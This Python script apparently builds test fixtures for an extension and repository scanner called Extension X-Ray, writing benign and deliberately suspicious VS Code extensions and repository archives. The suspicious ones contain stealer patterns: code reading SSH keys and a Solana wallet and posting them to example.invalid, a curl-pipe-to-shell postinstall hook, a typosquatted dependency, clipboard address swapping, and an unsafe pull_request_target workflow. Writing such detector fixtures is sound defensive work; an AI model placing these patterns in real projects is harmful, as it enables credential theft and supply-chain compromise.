from __future__ import annotations

import base64
import json
import zipfile
from pathlib import Path


ROOT = Path(__file__).resolve().parent
VALID_SHA512 = "sha512-" + base64.b64encode(bytes(64)).decode("ascii")


def write_vsix(path: Path, source: str, *, name: str) -> None:
    package = {
        "name": name,
        "displayName": name.replace("-", " ").title(),
        "publisher": "extension-xray",
        "version": "1.0.0",
        "description": "Synthetic local-only Extension X-Ray demonstration fixture.",
        "engines": {"vscode": "^1.90.0"},
        "activationEvents": ["onCommand:xray.demo"],
        "main": "./dist/extension.js",
        "contributes": {"commands": [{"command": "xray.demo", "title": "Run synthetic demo"}]},
    }
    with zipfile.ZipFile(path, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("extension/package.json", json.dumps(package, indent=2))
        archive.writestr("extension/dist/extension.js", source)
        archive.writestr("extension/README.md", "# Synthetic Extension X-Ray fixture\n")
        archive.writestr("[Content_Types].xml", "<Types></Types>")


def write_repository(path: Path, files: dict[str, str], *, root: str) -> None:
    with zipfile.ZipFile(path, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        for name, content in files.items():
            archive.writestr(f"{root}/{name}", content)


def main() -> None:
    write_vsix(
        ROOT / "benign-extension.vsix",
        """const vscode = require('vscode');
function activate(context) {
  const command = vscode.commands.registerCommand('xray.demo', () => 'hello');
  context.subscriptions.push(command);
}
exports.activate = activate;
""",
        name="synthetic-benign-extension",
    )
    write_vsix(
        ROOT / "suspicious-extension.vsix",
        """// Synthetic patterns only: no real credential collection or transmission.
const cp = require('child_process');
const fs = require('fs');
async function inspectSyntheticValues() {
  const value = process.env.SYNTHETIC_DEMO_TOKEN;
  const example = fs.readFileSync('/tmp/.ssh/id_rsa', 'utf8');
  await fetch('https://example.invalid/xray-demo', { method: 'POST', body: value + example });
  cp.exec('echo extension-xray-synthetic-demo');
  eval('1 + 1');
}
exports.inspectSyntheticValues = inspectSyntheticValues;
""",
        name="synthetic-suspicious-extension",
    )
    pinned_sha = "a" * 40
    write_repository(
        ROOT / "benign-repository.zip",
        {
            "package.json": json.dumps(
                {
                    "name": "synthetic-benign-repository",
                    "version": "1.0.0",
                    "description": "Synthetic repository with immutable CI references.",
                    "scripts": {"test": "vitest --run"},
                    "dependencies": {"kleur": "4.1.5"},
                },
                indent=2,
            ),
            "package-lock.json": json.dumps(
                {
                    "name": "synthetic-benign-repository",
                    "version": "1.0.0",
                    "lockfileVersion": 3,
                    "packages": {
                        "": {
                            "name": "synthetic-benign-repository",
                            "version": "1.0.0",
                            "dependencies": {"kleur": "4.1.5"},
                        },
                        "node_modules/kleur": {
                            "version": "4.1.5",
                            "resolved": "https://registry.npmjs.org/kleur/-/kleur-4.1.5.tgz",
                            "integrity": VALID_SHA512,
                        },
                    },
                },
                indent=2,
            ),
            "src/index.js": "export const greet = (name) => `hello ${name}`;\n",
            ".github/workflows/test.yml": (
                "name: test\non: [push]\njobs:\n  test:\n    runs-on: ubuntu-latest\n"
                f"    steps:\n      - uses: actions/checkout@{pinned_sha}\n"
            ),
        },
        root="benign-repository",
    )
    write_repository(
        ROOT / "suspicious-repository.zip",
        {
            "package.json": json.dumps(
                {
                    "name": "synthetic-crypto-stealer-patterns",
                    "version": "0.0.0",
                    "description": "Defensive synthetic patterns; never execute.",
                    "scripts": {
                        "postinstall": "curl https://example.invalid/install.sh | sh",
                        "test": "node scripts/bootstrap.js",
                    },
                    "dependencies": {
                        "elliptic": "6.5.3",
                        "lodahs": "4.17.21",
                        "remote-tool": "https://example.invalid/remote-tool.tgz",
                    },
                },
                indent=2,
            ),
            "package-lock.json": json.dumps(
                {
                    "name": "synthetic-crypto-stealer-patterns",
                    "version": "0.0.0",
                    "lockfileVersion": 3,
                    "packages": {
                        "": {
                            "name": "synthetic-crypto-stealer-patterns",
                            "version": "0.0.0",
                            "dependencies": {
                                "elliptic": "6.5.3",
                                "lodahs": "4.17.21",
                                "remote-tool": "https://example.invalid/remote-tool.tgz",
                            },
                        },
                        "node_modules/elliptic": {
                            "version": "6.5.3",
                            "resolved": "https://registry.npmjs.org/elliptic/-/elliptic-6.5.3.tgz",
                            "integrity": VALID_SHA512,
                        },
                        "node_modules/lodahs": {
                            "version": "4.17.21",
                            "resolved": "https://registry.npmjs.org/lodahs/-/lodahs-4.17.21.tgz",
                            "hasInstallScript": True,
                        },
                        "node_modules/remote-tool": {
                            "version": "1.0.0",
                            "resolved": "https://example.invalid/remote-tool-1.0.0.tgz",
                            "integrity": VALID_SHA512,
                        },
                    },
                },
                indent=2,
            ),
            "scripts/bootstrap.js": """// Defensive fixture only. No real secrets or live destination.
const fs = require('fs');
const cp = require('child_process');
async function inspect() {
  const wallet = fs.readFileSync(process.env.HOME + '/.config/solana/id.json');
  const packedWallet = Buffer.from(wallet).toString('base64');
  await fetch('https://example.invalid/collect', {method: 'POST', body: packedWallet});
  const current = await navigator.clipboard.readText();
  if (/^0x/.test(current)) await navigator.clipboard.writeText('0x1111111111111111111111111111111111111111');
  const injectedKey = process.env.WALLET_PRIVATE_KEY;
  cp.execFile('synthetic-tool', ['--key', injectedKey]);
}
exports.inspect = inspect;
""",
            "config/example.js": (
                "const mnemonic = 'synthetic alpha beta gamma delta epsilon zeta eta theta iota kappa lambda';\n"
            ),
            "config/encoded.js": "const privateKey = '" + ("a" * 64) + "';\n",
            ".github/workflows/unsafe.yml": """name: unsafe synthetic example
on: pull_request_target
jobs:
  test:
    permissions: write-all
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm test
""",
            ".vscode/tasks.json": json.dumps(
                {"version": "2.0.0", "tasks": [{"type": "shell", "command": "npm test"}]},
                indent=2,
            ),
            ".devcontainer/devcontainer.json": json.dumps(
                {"name": "demo", "postCreateCommand": "npm install"},
                indent=2,
            ),
        },
        root="suspicious-repository",
    )
    print("Generated two VSIX fixtures and two repository ZIP fixtures")


if __name__ == "__main__":
    main()

